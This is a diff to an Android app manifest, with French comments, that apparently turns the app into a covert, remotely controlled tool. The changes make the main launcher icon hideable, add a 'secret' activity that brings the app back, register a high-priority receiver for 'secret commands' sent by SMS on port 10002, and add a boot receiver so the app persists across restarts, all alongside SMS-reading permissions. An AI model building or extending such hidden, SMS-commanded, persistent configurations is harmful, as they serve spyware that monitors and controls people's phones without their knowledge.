@@ -11,6 +11,7 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.BROADCAST_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:allowBackup="true"
@@ -23,20 +24,54 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="34">
 
+        <!-- ✅ ACTIVITÉ PRINCIPALE — PEUT ÊTRE MASQUÉE -->
         <activity android:name=".MainActivity" android:exported="true"
-            android:label="@string/app_name">
+            android:label="@string/app_name"
+            android:icon="@android:drawable/ic_menu_myplaces"
+            android:roundIcon="@android:drawable/ic_menu_myplaces">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <receiver android:name=".SMSReceiver" android:exported="true"
+        <!-- ✅ ACTIVITÉ SECRÈTE — POUR FAIRE RÉAPPARAÎTRE L'APP -->
+        <activity android:name=".SecretLauncherActivity" android:exported="true"
+            android:label="🔓"
+            android:icon="@android:drawable/ic_menu_info_details"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+                <data android:scheme="bloom" android:host="open" />
+            </intent-filter>
+        </activity>
+
+        <!-- ✅ RECEVEUR SMS POUR COMMANDES SECRÈTES -->
+        <receiver android:name=".SecretCommandReceiver" android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                 <category android:name="android.intent.category.DEFAULT" />
+                <data android:port="10002" android:scheme="sms" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ✅ RECEVEUR SMS PRINCIPAL -->
+        <receiver android:name=".SMSReceiver" android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="998">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <category android:name="android.intent.category.DEFAULT" />
                 <data android:port="10001" android:scheme="sms" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ✅ DÉMARRER AU REDÉMARRAGE DU TÉLÉPHONE -->
+        <receiver android:name=".BootReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </receiver>
     </application>
